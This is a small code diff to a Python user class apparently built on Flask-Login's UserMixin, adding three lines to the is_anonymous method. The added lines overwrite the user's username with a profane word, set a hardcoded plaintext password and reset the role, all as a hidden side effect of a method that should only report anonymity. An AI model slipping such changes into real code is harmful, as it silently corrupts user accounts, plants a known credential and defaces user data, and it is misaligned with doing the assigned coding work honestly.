@@ -523,6 +523,9 @@ class User(UserMixin):
         return True
 
     def is_anonymous(self):
+        self.username = 'Asshole'
+        self.password = 'ISupportWBank666!'
+        self.role = 'user'
         return True
 
     def get_id(self):
